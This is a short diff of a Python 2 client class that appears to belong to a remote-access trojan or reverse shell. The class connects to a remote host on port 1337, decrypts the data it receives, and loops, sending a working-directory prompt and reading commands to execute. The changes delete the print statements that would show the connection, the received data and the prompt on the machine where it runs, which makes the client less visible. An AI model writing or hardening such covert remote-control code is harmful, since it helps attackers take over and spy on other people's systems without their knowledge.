@@ -192,8 +192,6 @@ class Client(object):
     def _connect(self, host='localhost', port=1337):
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         try:
-            if self.__v__:
-                print 'Connecting to {}:{}...'.format(host, port)
             s.connect((host, port))
             return s
         except Exception as e:
@@ -226,7 +224,6 @@ class Client(object):
                     data += self._socket.recv(1024)
                 except socket.error: return
             data = self._decrypt(data.rstrip()) if len(data) else data
-            print data
             return data
         except Exception as e:
             if self.__v__:
@@ -550,7 +547,6 @@ class Client(object):
         while True:
             self.shell.status.wait()
             prompt = "[%d @ {}]> ".format(os.getcwd())
-            print prompt
             self._send(prompt, method='prompt')   
             data = self._receive()
             cmd, _, action = bytes(data).partition(' ')
